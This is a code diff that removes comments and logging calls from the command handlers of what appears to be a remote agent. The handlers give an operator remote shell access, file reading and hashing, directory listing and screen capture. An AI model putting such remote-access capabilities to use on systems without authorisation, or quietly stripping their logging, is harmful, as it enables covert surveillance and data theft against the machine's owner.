@@ -73,14 +73,12 @@ static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath,
     return len;
 }
 
-// Writes a simple error response with the given status code
 static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
 {
     *response = new CHAR[*responseLength];
     *(PUINT32)*response = code;
 }
 
-// Checks if a directory entry is "." or ".."
 static BOOL IsDotEntry(const DirectoryEntry &entry)
 {
     return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
@@ -93,21 +91,15 @@ static BOOL IsDotEntry(const DirectoryEntry &entry)
 
 VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
-    LOG_INFO("Handling GetDirectoryContentCommand.");
-    // Buffer to hold the path from command
     WCHAR directoryPath[1024];
-    // Decoding path from command
     DecodeWirePath(command, commandLength, directoryPath, 1024);
-    LOG_INFO("GetDirectoryContent: %ws", directoryPath);
 
-    // Create a DirectoryIterator for the specified path and validate it
     auto result = DirectoryIterator::Create(directoryPath);
     if (!result)
     {
         WriteErrorResponse(response, responseLength, StatusCode::StatusError);
         return;
     }
-    // Iterator successfully created, so we can now read entries
     DirectoryIterator &iter = result.Value();
     Vector<DirectoryEntry> entries;
     if (!entries.Init())
@@ -115,7 +107,6 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
         WriteErrorResponse(response, responseLength, StatusCode::StatusError);
         return;
     }
-    // Iterate through the directory entries, skipping "." and "..", and add them to the vector
     while (iter.Next())
     {
         const DirectoryEntry &entry = iter.Get();
@@ -126,10 +117,8 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
             WriteErrorResponse(response, responseLength, StatusCode::StatusError);
             return;
         }
-        LOG_INFO("Directory entry added: %ws", entry.Name);
     }
 
-    // Prepare the response buffer - writing entry count, status code and array of WireDirectoryEntry structures
     UINT64 entryCount = (UINT64)entries.Count;
     *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
     *response = new CHAR[*responseLength];
@@ -143,23 +132,17 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
         Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
         ToWireEntry(entries.Data[i], wireEntries[i]);
     }
-    LOG_INFO("Directory content retrieved successfully with %llu entries", entryCount);
 }
 
 // Reads a chunk of file content
 VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
-    LOG_INFO("Handling GetFileContentCommand.");
-    // Getting parameters from command buffer: read count, offset and file path
     UINT64 readCount = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
-    LOG_INFO("Reading file content with offset: %llu and count: %llu.", offset, readCount);
 
-    // Decoding file path from command buffer
     USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
     WCHAR filePath[1024];
     DecodeWirePath(command + pathOffset, commandLength > pathOffset ? commandLength - pathOffset : 0, filePath, 1024);
-    LOG_INFO("GetFileContent: %ws offset=%llu count=%llu", filePath, offset, readCount);
 
     auto openResult = File::Open(filePath, File::ModeRead);
     if (!openResult)
@@ -167,9 +150,7 @@ VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR res
         WriteErrorResponse(response, responseLength, StatusCode::StatusError);
         return;
     }
-    LOG_INFO("File opened successfully: %ws", filePath);
 
-    // Prepare the response buffer - writing status code, bytes read and file content chunk
     File &file = openResult.Value();
     *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
     *response = new CHAR[*responseLength];
@@ -188,37 +169,26 @@ VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR res
 
     *(PUINT32)*response = StatusCode::StatusSuccess;
     *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;
-
-    LOG_INFO("File content read successfully for %llu bytes requested, %llu bytes read", readCount, bytesRead);
 }
 
 // Computes the SHA-256 hash of a file chunk
 VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
-    LOG_INFO("Handling GetFileChunkHashCommand.");
-    // Getting parameters from command buffer: chunk size, offset and file path
     UINT64 chunkSize = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
 
-    LOG_INFO("Computing file chunk hash with offset: %llu and chunk size: %llu.", offset, chunkSize);
-
-    // Decoding file path from command buffer
     USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
     WCHAR filePath[1024];
     DecodeWirePath(command + hashPathOffset, commandLength > hashPathOffset ? commandLength - hashPathOffset : 0, filePath, 1024);
-    LOG_INFO("GetFileChunkHash: %ws chunkSize=%llu offset=%llu", filePath, chunkSize, offset);
 
-    // Attempt to open the file and validate the result
     auto openResult = File::Open(filePath, File::ModeRead);
     if (!openResult)
     {
         WriteErrorResponse(response, responseLength, StatusCode::StatusError);
         return;
     }
-    LOG_INFO("File opened successfully: %ws", filePath);
 
     File &file = openResult.Value();
-    // Allocating a buffer for reading file chunks.
     UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
     PUINT8 buffer = new UINT8[bufferSize];
 
@@ -228,7 +198,6 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
     while (totalRead < chunkSize)
     {
         UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
-        LOG_INFO("Reading file chunk with offset: %llu and count: %llu.", offset + totalRead, bytesToRead);
         auto setOffsetResult = file.SetOffset((USIZE)(offset + totalRead));
 
         if (!setOffsetResult)
@@ -247,7 +216,6 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
         totalRead += bytesRead;
     }
     delete[] buffer;
-    // Prepare the response buffer - writing status code and SHA-256 digest of the file chunk
     *responseLength += SHA256_DIGEST_SIZE;
     *response = new CHAR[*responseLength];
 
@@ -256,7 +224,6 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
 
     *(PUINT32)*response = StatusCode::StatusSuccess;
     Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
-    LOG_INFO("GetFileChunkHash: hashed %llu bytes", (UINT64)totalRead);
 }
 
 // Open (spawn) a shell. Request: (none). Response: [status:4][shellId:8].
@@ -264,8 +231,6 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
 // reuse it for Read/Write/Close.
 VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    LOG_INFO("Handling OpenShellCommand.");
-
     auto openResult = context->shellManager.Open();
     if (!openResult)
     {
@@ -275,7 +240,6 @@ VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] US
     }
 
     ShellId shellId = openResult.Value();
-    LOG_INFO("Shell opened, assigned id %llu", shellId);
     *responseLength = sizeof(UINT32) + sizeof(ShellId);
     *response = new CHAR[*responseLength];
     *(PUINT32)*response = StatusCode::StatusSuccess;
@@ -285,8 +249,6 @@ VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] US
 // Writes a command to a shell. Payload: [shellId:8][UTF-8 input + '\0']
 VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    LOG_INFO("Handling WriteShellCommand.");
-
     if (commandLength < sizeof(ShellId))
     {
         LOG_ERROR("WriteShell: missing shell id");
@@ -318,9 +280,7 @@ VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
         WriteErrorResponse(response, responseLength, StatusCode::StatusError);
         return;
     }
-    LOG_INFO("Command written to shell (id %llu), bytes written: %llu", shellId, writeResult.Value());
 
-    // Prepare the response buffer - writing status code
     *response = new CHAR[*responseLength];
     *(PUINT32)*response = StatusCode::StatusSuccess;
 }
@@ -328,8 +288,6 @@ VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
 // Reads a chunk of data from a shell's stdout. Payload: [shellId:8]
 VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    LOG_INFO("Handling ReadShellCommand.");
-
     if (commandLength < sizeof(ShellId))
     {
         LOG_ERROR("ReadShell: missing shell id");
@@ -357,7 +315,6 @@ VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response
         return;
     }
 
-    // Construct the response with status code and the data read from the shell
     USIZE bytesRead = readResult.Value() + 1;
     *responseLength += bytesRead;
     *response = new CHAR[*responseLength];
@@ -368,8 +325,6 @@ VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response
 // Close a shell instance. Payload: [shellId:8]. Idempotent.
 VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    LOG_INFO("Handling CloseShellCommand.");
-
     if (commandLength < sizeof(ShellId))
     {
         LOG_ERROR("CloseShell: missing shell id");
@@ -380,7 +335,6 @@ VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
     ShellId shellId = 0;
     Memory::Copy(&shellId, command, sizeof(shellId));
     context->shellManager.Close(shellId);
-    LOG_INFO("Shell instance closed for id %llu", shellId);
 
     *responseLength = sizeof(UINT32);
     *response = new CHAR[*responseLength];
@@ -398,8 +352,6 @@ VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
 // targets (on UEFI, ExitProcess() maps to EfiResetShutdown and powers off).
 VOID Handle_ExitCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    LOG_INFO("Handling ExitCommand: operator requested agent termination.");
-
     // Acknowledge so the operator knows the exit was received and will be honored.
     *responseLength = sizeof(UINT32);
     *response = new CHAR[*responseLength];
@@ -412,12 +364,9 @@ VOID Handle_ExitCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE c
 // Gets the list of display devices and their information
 VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    LOG_INFO("Handling GetDisplaysCommand.");
-
     if (context->screenCaptureContext == nullptr)
         context->screenCaptureContext = new ScreenCaptureContext();
 
-    // Getting the list of display devices and validating the result
     auto displays = Screen::GetDevices();
     if (!displays)
     {
@@ -425,19 +374,15 @@ VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] 
         WriteErrorResponse(response, responseLength, StatusCode::StatusError);
         return;
     }
-    LOG_INFO("Display devices enumerated successfully with %u display(s)", displays.Value().Count);
 
     ScreenDeviceList &deviceList = displays.Value();
     context->screenCaptureContext->DeviceList = deviceList;
 
-    // Prepare the response buffer - writing status code, device count and array of ScreenDevice structures
     *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));
     *response = new CHAR[*responseLength];
     *(PUINT32)*response = StatusCode::StatusSuccess;
     Memory::Copy(*response + sizeof(UINT32), &deviceList.Count, sizeof(deviceList.Count));
     Memory::Copy(*response + sizeof(UINT32) + sizeof(deviceList.Count), deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice)));
-
-    LOG_INFO("GetDisplays: %u display(s)", deviceList.Count);
 }
 
 // Callback function for JPEG encoding - called by the encoder to write encoded data chunks
@@ -457,7 +402,6 @@ VOID JpegCallback(PVOID context, PVOID data, INT32 size)
         jpegBuffer->outputBuffer = newBuffer;
         jpegBuffer->size = newSize;
     }
-    // Copy the encoded data chunk into the buffer and update the offset
     Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
     jpegBuffer->offset += (UINT32)size;
 }
@@ -465,17 +409,13 @@ VOID JpegCallback(PVOID context, PVOID data, INT32 size)
 // Gets a screenshot of the specified display device
 VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
-    // Retrieve parameters from command buffer
     auto displayIndex = *(PUINT32)(command);
     auto quality = *(PUINT32)(command + sizeof(UINT32));
     auto isFullScreen = *(PUINT32)(command + sizeof(UINT32) + sizeof(UINT32));
-    LOG_INFO("Handling GetScreenshotCommand for display index: %u, quality: %u, isFullScreen: %u", displayIndex, quality, isFullScreen);
 
-    // Ensure the screen capture context exists - create it if it doesn't, and validate the result
     if (context->screenCaptureContext == nullptr)
         context->screenCaptureContext = new ScreenCaptureContext();
 
-    // Getting the device list
     if (context->screenCaptureContext->DeviceList.Count == 0)
     {
         auto displays = Screen::GetDevices();
@@ -486,7 +426,6 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
             return;
         }
         context->screenCaptureContext->DeviceList = displays.Value();
-        LOG_INFO("Display devices enumerated successfully with %u display(s)", context->screenCaptureContext->DeviceList.Count);
     }
 
     const ScreenDevice &device = context->screenCaptureContext->DeviceList.Devices[displayIndex];
@@ -499,7 +438,6 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
     if (!graphics.IsInitialized())
         graphics.Init(device);
 
-    // Attempt to capture the screen and validate the result
     if (!Screen::Capture(device, Span<RGB>(graphics.currentScreenshot, device.Width * device.Height)))
     {
         LOG_ERROR("Failed to capture the screen for display index: %u", displayIndex);
@@ -523,10 +461,8 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
 
         Rectangle rect(0, 0, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);
 
-        // We are sending the full JPEG data in one segment, so the segment count is 1
         UINT32 countOfSegments = 1;
 
-        // Write response
         *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + graphics.jpegBuffer.offset;
         *response = new CHAR[*responseLength];
         *(PUINT32)*response = StatusCode::StatusSuccess;
@@ -569,7 +505,6 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
 
         countOfRects++;
 
-        // Copy rectangle region row-by-row
         for (INT32 j = 0; j < rectHeight; j++)
             Memory::Copy(graphics.rectBuffer + j * rectWidth, graphics.currentScreenshot + (dr.Y + j) * device.Width + dr.X, (USIZE)rectWidth * sizeof(RGB));
 
@@ -605,7 +540,6 @@ VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLe
     // Copy the current screenshot to the screenshot buffer for the next comparison
     Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));
 
-    // Construct the response
     *(PUINT32)(packet + sizeof(UINT32)) = countOfRects;
     *response = packet;
     *responseLength = offset;
